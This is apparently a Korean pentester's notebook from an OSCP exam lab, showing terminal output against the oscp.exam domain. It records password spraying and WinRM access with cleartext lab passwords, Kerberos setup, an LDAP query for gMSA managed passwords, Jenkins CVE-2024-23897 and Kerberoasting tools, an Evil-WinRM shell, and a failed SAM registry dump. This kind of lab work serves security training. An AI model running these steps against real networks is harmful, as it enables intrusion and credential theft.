SMB         172.16.91.202   445    SRV22            [+] oscp.exam\b.martin:MartiniAllNight222 

┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ nxc winrm 172.16.91.202 -u 'b.martin' -p 'MartiniAllNight222'
WINRM       172.16.91.202   5985   SRV22            [*] Windows 10 / Server 2019 Build 17763 (name:SRV22) (domain:oscp.exam)
WINRM       172.16.91.202   5985   SRV22            [+] oscp.exam\b.martin:MartiniAllNight222 (Pwn3d!)



```

![[Pasted image 20260321110732.png]]![[Pasted image 20260321112211.png]]
![[Pasted image 20260321112410.png]]


jenkins 2.440.3 버전 확인
![[Pasted image 20260322021149.png]]

????
![[Pasted image 20260322022059.png]]


????
![[Pasted image 20260322023321.png]]


![[Pasted image 20260322023551.png]]

![[Pasted image 20260322023610.png]]



```bash
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206/172.16.91.202]
└─$ netexec smb DC20.oscp.exam -u 'r.andrews' -p 'BusyOfficeWorker890' -k --generate-krb5-file vintage-krb5.conf
SMB         DC20.oscp.exam  445    DC20             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC20) (domain:oscp.exam) (signing:True) (SMBv1:False)
SMB         DC20.oscp.exam  445    DC20             [+] oscp.exam\r.andrews:BusyOfficeWorker890 
                                                                                                                    
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206/172.16.91.202]
└─$ ls
51993.py  CVE-2024-23897  jenkins-cli.jar  poc.py  Rubeus.exe  targetedKerberoast.py  vintage-krb5.conf
                                                                                                                    
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206/172.16.91.202]
└─$ netexec smb DC20.oscp.exam -u 'r.andrews' -p 'BusyOfficeWorker890' -k --generate-krb5-file oscp-krb5.conf
SMB         DC20.oscp.exam  445    DC20             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC20) (domain:oscp.exam) (signing:True) (SMBv1:False)
SMB         DC20.oscp.exam  445    DC20             [+] oscp.exam\r.andrews:BusyOfficeWorker890 
c                                                                                                                    
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206/172.16.91.202]
└─$ cat oscp-krb5.conf 

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = OSCP.EXAM

[realms]
    OSCP.EXAM = {
        kdc = dc20.oscp.exam
        admin_server = dc20.oscp.exam
        default_domain = oscp.exam
    }

[domain_realm]
    .oscp.exam = OSCP.EXAM
    oscp.exam = OSCP.EXAM
                                                                                                                    
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206/172.16.91.202]
└─$ export KRB5_CONFIG=$(pwd)/oscp-krb5.conf
                                                                                                                    
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206/172.16.91.202]
└─$ kinit 'b.martin@oscp.exam'
kinit: Cannot find KDC for realm "oscp.exam" while getting initial credentials
                                                                                                                    
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206/172.16.91.202]
└─$ kinit 'b.martin@dc20.oscp.exam'
kinit: Cannot find KDC for realm "dc20.oscp.exam" while getting initial credentials
                                                                                                                    
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206/172.16.91.202]
└─$ kinit 'b.martin@OSCP.EXAM'     
Password for b.martin@OSCP.EXAM: 

```


```bash

┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206/172.16.91.202]
└─$ ldapsearch -LLL -H ldap://dc20.OSCP.EXAM -Y GSSAPI \
-b 'DC=OSCP,DC=EXAM' '(&(objectClass=msDS-GroupManagedServiceAccount))' \
msDS-ManagedPassword
SASL/GSSAPI authentication started
SASL username: b.martin@OSCP.EXAM
SASL SSF: 256
SASL data security layer installed.
# refldap://ForestDnsZones.oscp.exam/DC=ForestDnsZones,DC=oscp,DC=exam

# refldap://DomainDnsZones.oscp.exam/DC=DomainDnsZones,DC=oscp,DC=exam

# refldap://oscp.exam/CN=Configuration,DC=oscp,DC=exam

                                                                                                                    
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206/172.16.91.202]
└─$ kinit 'r.andrews@OSCP.EXAM'
Password for r.andrews@OSCP.EXAM: 
kinit: Password incorrect while getting initial credentials
                                                                                                                    
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206/172.16.91.202]
└─$ kinit 'r.andrews@OSCP.EXAM'
Password for r.andrews@OSCP.EXAM: 
                                                       
```

![[Pasted image 20260322040920.png]]



```bash

Evil-WinRM* PS C:\Users\b.martin\Documents> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    147       9     6628      12128              3952   0 conhost
    433      17     1956       5152               380   0 csrss
    163       9     1608       4632               484   1 csrss
    254      14     3808      13168              3136   0 dllhost
    542      22    23984      49748               968   1 dwm
     48       6     1624       4008               788   1 fontdrvhost
     48       6     1596       4184               796   0 fontdrvhost
      0       0       56          8                 0   0 Idle
    764      28   307736     276116              3944   0 java
    264      15    18184      20928              3712   0 jenkins
    470      26    12532      49364              2428   1 LogonUI
    980      31     5920      16608               644   0 lsass
    223      13     3184      10044              3304   0 msdtc
      0      12      288      72740                88   0 Registry
    540      14     5016      12304               624   0 services
     53       3      456       1116               272   0 smss
    186      11     1776       8116               336   0 svchost
    116       7     1364       5848               404   0 svchost
    115      14     2840       6868               476   0 svchost
    218      12     1744       7808               488   0 svchost
    127       7     1632       6232               660   0 svchost
    210      15     6224      10476               732   0 svchost
     85       5      952       3804               744   0 svchost
    640      16     5212      14564               768   0 svchost
    594      16     3632       9716               876   0 svchost
    231      10     1692       6772               928   0 svchost
    268      13     3700      11088              1008   0 svchost
    204       9     1744       6684              1036   0 svchost
    243      13     2768       8644              1080   0 svchost
    336      13     9364      13552              1112   0 svchost
    399      32     8228      17316              1304   0 svchost
    236      15     2424      11488              1324   0 svchost
    255      13     2996      15880              1332   0 svchost
    125       7     1256       5552              1340   0 svchost
    415       9     2636       8732              1348   0 svchost
    115       7     1196       5468              1356   0 svchost
    366      16     4372      12600              1364   0 svchost
    228      12     2652      12076              1460   0 svchost
    132       8     1428       5876              1540   0 svchost
    309      10     2608       8440              1580   0 svchost
    356      17     4848      14096              1600   0 svchost
    302      11     1956       8932              1624   0 svchost
    182      11     1864       7992              1700   0 svchost
    138       9     1556       6684              1768   0 svchost
    212      12     2064       8808              1848   0 svchost
    153       8     2020       7152              1904   0 svchost
    402      16    13208      22348              2032   0 svchost
    178      10     1780       8336              2044   0 svchost
    468      17     3424      12344              2088   0 svchost
    190      22     2576      10196              2120   0 svchost
    430      19    11468      24316              2132   0 svchost
    133       9     1532       6396              2180   0 svchost
    136       8     1524       6056              2236   0 svchost
    128       7     1192       5376              2260   0 svchost
    208      11     2140       8196              2276   0 svchost
    160      10     2064      12628              2360   0 svchost
    271      27     3648      12716              2440   0 svchost
    161       9     2792       7440              2596   0 svchost
    381      24     3268      12156              2652   0 svchost
    163      10     1864       7308              3036   0 svchost
    214      12     2332      10992              3776   0 svchost
    240      13     3008      12420              4700   0 svchost
    310      15    13476      15760              4764   0 svchost
    148       9     1508       6592              4772   0 svchost
    273      19     7824      12892              4944   0 svchost
    304      17     5248      21516              5100   0 svchost
   1436       0      192        104                 4   0 System
    167      11     2872      11252              2320   0 VGAuthService
    143       8     1660       6788              2336   0 vm3dservice
    136       9     1744       7112              2680   1 vm3dservice
    407      25    10644      22956              2328   0 vmtoolsd
    170      11     1316       6596               500   0 wininit
    237      12     2492      18272               548   1 winlogon
    353      17     8884      18572              3152   0 WmiPrvSE
    736      27    56144      71756       0.55   5008   0 wsmprovhost

```



```powershell
*Evil-WinRM* PS C:\Users\b.martin\Documents> reg.exe save hklm\sam sam
reg.exe : ERROR: A required privilege is not held by the client.
    + CategoryInfo          : NotSpecified: (ERROR: A requir... by the client.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

```

